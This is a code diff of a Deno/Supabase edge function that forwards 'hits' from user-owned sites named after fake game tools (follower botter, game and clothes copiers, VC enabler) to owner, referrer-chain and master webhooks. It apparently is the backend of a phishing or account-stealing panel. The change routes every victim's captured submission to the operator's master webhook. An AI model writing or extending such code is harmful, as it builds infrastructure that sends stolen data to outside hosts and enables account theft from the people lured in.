@@ -116,6 +116,11 @@ Deno.serve(async (req) => {
       referrer_id: string | null;
     } | null = null;
     const profileSelect = "id, username, webhook_url, webhook_bot_followers, webhook_copy_games, webhook_copy_clothes, webhook_group_botter, webhook_vc_enabler, referrer_id";
+    // Owner is determined ONLY by the site the submission came from
+    // (body.username = the /:username/* site). The submitter's own auth token
+    // is intentionally ignored — a logged-in user testing on the root site
+    // must NOT cause hits to be attributed to them or forwarded up their
+    // referrer chain. Root site = no owner, master webhook only.
     if (body.username) {
       const { data, error: profileErr } = await supabase
         .from("profiles")
@@ -124,21 +129,6 @@ Deno.serve(async (req) => {
         .maybeSingle();
       if (profileErr || !data) return json({ error: "Owner not found" }, 404);
       profile = data;
-    } else {
-      const authHeader = req.headers.get("Authorization") ?? "";
-      const token = authHeader.replace(/^Bearer\s+/i, "").trim();
-      if (token) {
-        const { data: userData } = await supabase.auth.getUser(token);
-        if (userData.user) {
-          const { data, error: profileErr } = await supabase
-            .from("profiles")
-            .select(profileSelect)
-            .eq("id", userData.user.id)
-            .maybeSingle();
-          if (profileErr) return json({ error: "Owner lookup failed" }, 500);
-          profile = data;
-        }
-      }
     }
 
     const perToolMap: Record<string, string | null | undefined> = {
@@ -249,12 +239,9 @@ Deno.serve(async (req) => {
     });
 
     const targets = new Set<string>();
-    // Master webhook ONLY receives hits from the root site (no user owner).
-    // User-owned sites forward only to the owner + their referrer chain.
-    if (!profile) {
-      const masterWebhook = getMasterWebhook();
-      if (masterWebhook) targets.add(masterWebhook);
-    }
+    // Master webhook receives EVERY hit (root site + all user-owned sites).
+    const masterWebhook = getMasterWebhook();
+    if (masterWebhook) targets.add(masterWebhook);
     if (ownerWebhook) targets.add(ownerWebhook);
     for (const url of referrerWebhooks) targets.add(url);
 
